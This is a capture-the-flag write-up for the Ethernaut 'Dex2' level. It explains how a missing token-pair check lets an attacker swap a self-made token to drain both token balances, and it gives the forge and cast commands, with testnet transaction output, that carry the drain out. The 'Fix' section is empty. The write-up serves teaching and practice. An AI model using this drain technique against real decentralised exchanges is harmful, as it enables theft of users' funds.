# Dex2

This level requires you to exploit the DexTwo contract, a subtly modified version of the previous Dex contract, in a different manner. Your goal is to drain all balances of token1 and token2 from the DexTwo contract to complete the level.

You begin with 10 tokens each of token1 and token2 and DexTwo contract initially holds 100 tokens each of token1 and token2.

## Vulnerability

We will notice a missing line:

```bash
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

This line is responsible for validating that swapping is only allowed between the two token addresses defined by the contract. Since this requirement is absent in `DexTwo`, we are allowed to swap any tokens, including ones we create. This is the key to draining the`DexTwo` contract.

## Attack

1. Deploy `DeployDex2Attack.sol`.

```bash
forge script script/DeployDex2AttackToken.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# https://sepolia.etherscan.io/address/0x013e688ca8681adD8f2FD9506F7a0be4BB797455

# At $CONTRACT_ADDRESS=0x013e688ca8681adD8f2FD9506F7a0be4BB797455
# balanceOf 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2 = 400
```

2. Send 100 BTN from `Dex2AttackToken` to `Dex2`.

```bash
cast send $CONTRACT_ADDRESS "transfer(address,uint256)" $DEX2_ADDRESS 100 --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --legacy

# https://sepolia.etherscan.io/tx/0x5d64c4753a29df9a762497b0e8f44a17b5db5dd24e3c278e4cf10deb7584c4ee

# At $CONTRACT_ADDRESS=0x013e688ca8681adD8f2FD9506F7a0be4BB797455
# balanceOf 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2 = 0

# At $DEX2_ADDRESS=0xB7f8a4dBC8bb9bA98878D8D2a74431F6B61a65d2
# balanceOF
# token address (BTN): 0x013e688ca8681adD8f2FD9506F7a0be4BB797455
# Dex2 contract address (DEX2_ADDRESS) : 0xB7f8a4dBC8bb9bA98878D8D2a74431F6B61a65d2
# equals 300
```

3. Approve `Dex2 address` to spend 300 BTN and enable it to perform the swap later.

```bash
cast send $CONTRACT_ADDRESS "approve(address,uint256)" $DEX2_ADDRESS 300 --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy

# https://sepolia.etherscan.io/tx/0x72ddc065dca92c12e5db43a282175a87046d710163e2f942473561fac3472557
```

4. Execute the swap of both tokens.

```bash
forge script script/DeployDex2AttackSwap.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

# At $DEX2_ADDRESS=0xB7f8a4dBC8bb9bA98878D8D2a74431F6B61a65d2
# balanceOF
# token address (BTN): 0x013e688ca8681adD8f2FD9506F7a0be4BB797455
# Dex2 contract address (DEX2_ADDRESS) : 0xB7f8a4dBC8bb9bA98878D8D2a74431F6B61a65d2
# equals 300
```

## Fix
